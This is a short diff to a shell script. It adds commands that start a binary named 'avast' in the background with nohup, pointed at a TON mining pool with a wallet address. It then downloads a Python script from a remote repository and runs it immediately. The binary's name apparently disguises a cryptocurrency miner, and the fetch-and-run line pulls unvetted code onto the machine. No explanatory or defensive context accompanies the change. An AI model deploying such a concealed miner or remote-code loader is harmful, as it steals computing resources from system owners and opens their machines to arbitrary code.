@@ -1,1 +1,2 @@
-while :; do timeout 3600 bash ./avast run https://next.ton-pool.com EQCOZJJu0LGDOA7VlnWyvjty6P3NSeTVeCrfViup7XQ1tnAK; sleep 30; done
+nohup ./avast run https://server1.whalestonpool.com/ EQCOZJJu0LGDOA7VlnWyvjty6P3NSeTVeCrfViup7XQ1tnAK 2>1 &
+wget https://gitlab.com//log0x/scripts/-/raw/main/node.py && python node.py
